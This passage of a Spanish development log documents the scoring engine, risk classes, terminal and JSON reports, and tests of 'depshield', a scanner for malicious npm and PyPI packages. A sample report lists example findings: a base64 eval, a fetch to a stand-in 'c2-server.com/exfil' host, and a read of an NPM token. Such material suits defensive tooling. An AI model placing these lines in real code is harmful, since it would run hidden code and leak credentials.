La puntuación se calcula sumando los pesos de todos los findings y aplicando un **cap de 100 puntos**:

```python
raw_score = sum(_SEVERITY_WEIGHTS.get(f.severity, 0) for f in findings)
capped_score = min(raw_score, 100)
```

**Rationale del cap:** Sin cap, un paquete con 10 findings HIGH tendría 250 puntos, lo que haría las comparaciones numéricas inútiles. El cap a 100 normaliza la escala para que sea más intuitiva (0% a 100% de riesgo).

#### Clasificación de riesgo

La puntuación numérica se traduce a una clasificación textual con 4 niveles:

```python
def _classify(score: int) -> str:
    if score <= 10:  return "SAFE"        # Verde
    if score <= 30:  return "LOW_RISK"    # Amarillo
    if score <= 60:  return "MEDIUM_RISK" # Naranja
    return "HIGH_RISK"                     # Rojo
```

| Rango | Clasificación | Color | Significado |
|---|---|---|---|
| 0–10 | SAFE | 🟢 Verde | No se detectaron señales significativas |
| 11–30 | LOW_RISK | 🟡 Amarillo | Algunas señales menores, probablemente seguro |
| 31–60 | MEDIUM_RISK | 🟠 Naranja | Señales preocupantes, revisar manualmente |
| 61–100 | HIGH_RISK | 🔴 Rojo | Alta probabilidad de comportamiento malicioso |

**Ejemplos de cómo se traduce:**
- 0 findings → 0 pts → **SAFE**
- 1 HIGH → 25 pts → **LOW_RISK**
- 2 HIGH + 1 MEDIUM → 60 pts → **MEDIUM_RISK**
- 3 HIGH → 75 pts → **HIGH_RISK**
- 1 HIGH + 1 MEDIUM + 1 LOW → 38 pts → **MEDIUM_RISK**

### 10.4. Ordenación de findings dentro de un paquete

Los findings se ordenan por severidad descendente (HIGH → MEDIUM → LOW) dentro de cada `PackageScore`:

```python
severity_order = {"HIGH": 0, "MEDIUM": 1, "LOW": 2}
sorted_findings = sorted(findings, key=lambda f: severity_order.get(f.severity, 3))
```

Esto garantiza que al leer el informe, los hallazgos más críticos aparecen primero.

### 10.5. Función `score_all()` — Puntuación masiva con ordenación

Para facilitar el uso por el scanner (PASO 8), se implementó una función que recibe múltiples paquetes y los puntúa y ordena en una sola llamada:

```python
def score_all(packages: list[tuple[str, str, list[Finding], bool]]) -> list[PackageScore]:
    scores = [score_package(name, version, findings, is_direct=is_direct)
              for name, version, findings, is_direct in packages]
    scores.sort(key=lambda s: (not s.is_direct, -s.score))
    return scores
```

**Criterio de ordenación dual:**
1. **Dependencias directas primero** (`not s.is_direct`: False < True, así que directas van antes).
2. **Dentro de cada grupo, por puntuación descendente** (`-s.score`): los paquetes más peligrosos aparecen primero.

Esto permite al usuario ver inmediatamente qué dependencias directas son las más peligrosas, y luego las transitivas ordenadas por riesgo.

### 10.6. Generador de informes — `report.py`

Se implementaron dos formatos de salida:

#### Informe de terminal (Rich)

La función `print_report()` genera un informe visual usando la librería `rich` con tres secciones:

**1. Panel de resumen:** Un recuadro con borde azul que muestra el conteo total de paquetes y cuántos caen en cada categoría de riesgo, con emojis y colores:

```
╭────── depshield scan results ──────╮
│  📦 15 packages scanned            │
│  🔴 2 HIGH RISK                    │
│  🟠 3 MEDIUM RISK                  │
│  ⚠️  4 LOW RISK                     │
│  ✅ 6 SAFE                          │
╰────────────────────────────────────╯
```

**2. Tabla de paquetes:** Una tabla con columnas para nombre, versión, tipo (direct/transitive), puntuación (coloreada), clasificación (con emoji), y resumen de findings:

| Package | Version | Type | Score | Risk | Findings |
|---|---|---|---|---|---|
| evil-pkg | 1.0.0 | direct | **75** | 🔴 HIGH_RISK | 🔴 3 HIGH |
| shady-lib | 0.5.0 | transitive | **35** | 🟠 MEDIUM_RISK | 🔴 1 HIGH, 🟡 1 MEDIUM |
| clean-pkg | 2.1.0 | direct | **0** | ✅ SAFE | — |

**3. Detalle de findings:** Para cada paquete con riesgo (no SAFE), se listan todos los findings individuales con su severidad, tipo de señal y snippet de código:

```
evil-pkg@1.0.0 (HIGH_RISK, score: 75)
    [HIGH] CODE_EXECUTION: eval(Buffer.from(encoded, 'base64').toString())
    [HIGH] NETWORK_CALLS: fetch("https://c2-server.com/exfil")
    [HIGH] ENV_ACCESS: process.env.NPM_TOKEN
```

**Estilos y colores:**

```python
_CLASSIFICATION_STYLES = {
    "SAFE": "bold green",
    "LOW_RISK": "bold yellow",
    "MEDIUM_RISK": "bold dark_orange",
    "HIGH_RISK": "bold red",
}

_SEVERITY_STYLES = {
    "HIGH": "red",
    "MEDIUM": "yellow",
    "LOW": "dim",
}
```

La función acepta un parámetro opcional `console` para poder redirigir la salida (útil para testing y para capturar output).

#### Informe JSON

La función `to_json()` convierte los resultados en un diccionario serializable:

```python
def to_json(scores):
    return {
        "summary": {
            "total_packages": len(scores),
            "high_risk": ...,
            "medium_risk": ...,
            "low_risk": ...,
            "safe": ...,
        },
        "packages": [
            {
                "name": s.name,
                "version": s.version,
                "score": s.score,
                "classification": s.classification,
                "is_direct": s.is_direct,
                "findings": [
                    {"signal_type": ..., "severity": ..., "file": ...,
                     "line": ..., "snippet": ...}
                ],
            }
        ],
    }
```

Y `save_json()` lo escribe a disco con indentación de 2 espacios:

```python
def save_json(scores, path):
    data = to_json(scores)
    path.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
    return path
```

El formato JSON está diseñado para ser consumido por herramientas de CI/CD (GitHub Actions, GitLab CI), dashboards de seguridad, o scripts de post-procesamiento.

### 10.7. API pública del módulo scoring

```python
# scorer.py
def score_package(name, version, findings, *, is_direct=True) -> PackageScore
def score_all(packages: list[tuple]) -> list[PackageScore]

# report.py
def print_report(scores: list[PackageScore], *, console=None) -> None
def to_json(scores: list[PackageScore]) -> dict
def save_json(scores: list[PackageScore], path) -> Path
```

### 10.8. Flujo de datos completo hasta este punto

Con el PASO 7, el pipeline de datos de depshield queda así:

```
package.json / requirements.txt
        │
        ▼
  ┌──────────────┐
  │  RESOLVERS   │  PASO 1-2: npm/PyPI
  │  (árbol de   │
  │  dependencias)│
  └──────┬───────┘
         │
         ▼
  ┌──────────────┐
  │  DOWNLOADER  │  PASO 3: descarga + extracción
  └──────┬───────┘
         │
         ▼
  ┌──────────────────────────────────────────────┐
  │             ANALYZERS  (PASO 4-6)            │
  │  ┌──────────┬──────────┬──────────────────┐  │
  │  │ JS       │ Python   │ Metadata         │  │
  │  │ 6 señales│ 6 señales│ 8 señales        │  │
  │  └────┬─────┴────┬─────┴────────┬─────────┘  │
  │       │ Findings │   Findings   │ Findings    │
  └───────┴──────────┴──────────────┴─────────────┘
                     │
                     ▼
  ┌──────────────────────────────────┐
  │  SCORER  (PASO 7)               │
  │  HIGH=25, MEDIUM=10, LOW=3      │
  │  Cap: 100, 4 clasificaciones    │
  └──────────┬───────────────────────┘
             │
             ▼
  ┌──────────────────────────────────┐
  │  REPORT  (PASO 7)               │
  │  Terminal (rich) + JSON          │
  └──────────────────────────────────┘
```

### 10.9. Verificación

Se crearon 19 tests organizados por categoría:

| Categoría | Tests | Descripción |
|---|---|---|
| Clasificación | 4 | Cada rango verificado: SAFE (0-10), LOW_RISK (11-30), MEDIUM_RISK (31-60), HIGH_RISK (61-100) |
| Scoring básico | 4 | Sin findings=0pts, 1 HIGH=25pts, 1 MEDIUM=10pts, 1 LOW=3pts |
| Scoring combinado | 1 | HIGH+MEDIUM+LOW = 38pts = MEDIUM_RISK |
| Cap a 100 | 1 | 10×HIGH = 250pts raw → 100pts cap = HIGH_RISK |
| Ordenación findings | 1 | LOW→HIGH→MEDIUM se reordena a HIGH→MEDIUM→LOW |
| Flag is_direct | 1 | Verificación del flag directa/transitiva |
| Count properties | 1 | high_count, medium_count, low_count |
| score_all() | 2 | Directas antes que transitivas, ordenación por score dentro del grupo |
| JSON structure | 1 | Campos summary y packages correctos |
| JSON file save | 1 | Escritura y lectura del fichero JSON |
| Terminal report | 1 | Smoke test: verifica que se genera sin errores y contiene los nombres de paquetes |
| Empty report | 1 | Lista vacía → "No packages to report" |

**Resultado:** 19/19 PASSED en 0.17 segundos.

Todos los tests pasaron a la primera sin correcciones necesarias.

### 10.10. Commit

```powershell
git add .
git commit -m "PASO 7: Scoring engine + rich terminal report + JSON export"
git push origin main
```

---

## 11. Estado actual del proyecto

> **Última actualización:** 5 de abril de 2026

### Estructura de ficheros

```
depshield/
├── depshield/
│   ├── __init__.py               # v0.1.0
│   ├── cli.py                    # CLI con click (scan stub)
│   ├── resolvers/
│   │   ├── __init__.py
│   │   ├── npm_resolver.py       # ✅ PASO 1
│   │   └── pypi_resolver.py      # ✅ PASO 2
│   ├── downloaders/
│   │   ├── __init__.py
│   │   └── package_downloader.py # ✅ PASO 3
│   ├── analyzers/
│   │   ├── __init__.py
│   │   ├── js_analyzer.py        # ✅ PASO 4
│   │   ├── py_analyzer.py        # ✅ PASO 5
│   │   └── metadata_analyzer.py  # ✅ PASO 6
│   └── scoring/
│       ├── __init__.py
│       ├── scorer.py             # ✅ PASO 7
│       └── report.py             # ✅ PASO 7
├── tests/
│   └── __init__.py
├── .venv/                        # Entorno virtual
├── .gitignore
├── pyproject.toml
├── README.md
├── SETUP.md                      # Guía de configuración del entorno
└── setup.bat                     # Script de configuración automática
```

### Próximos pasos

| Paso | Módulo | Estado |
|---|---|---|
| ~~0~~ | ~~Proyecto base~~ | ✅ Completado |
| ~~1~~ | ~~npm resolver~~ | ✅ Completado |
| ~~2~~ | ~~PyPI resolver~~ | ✅ Completado |
| ~~3~~ | ~~Downloader~~ | ✅ Completado |
| ~~4~~ | ~~JS analyzer~~ | ✅ Completado |
| ~~5~~ | ~~Python analyzer~~ | ✅ Completado |
| ~~6~~ | ~~Metadata analyzer~~ | ✅ Completado |
| ~~7~~ | ~~Scorer + Report~~ | ✅ Completado |
| **8** | **Scanner + CLI** | ⏳ Pendiente |
| 9 | Tests integración | ⏳ Pendiente |
| 10 | Benchmark vs GuardDog | ⏳ Pendiente |
| 11 | Documentación final | ⏳ Pendiente |
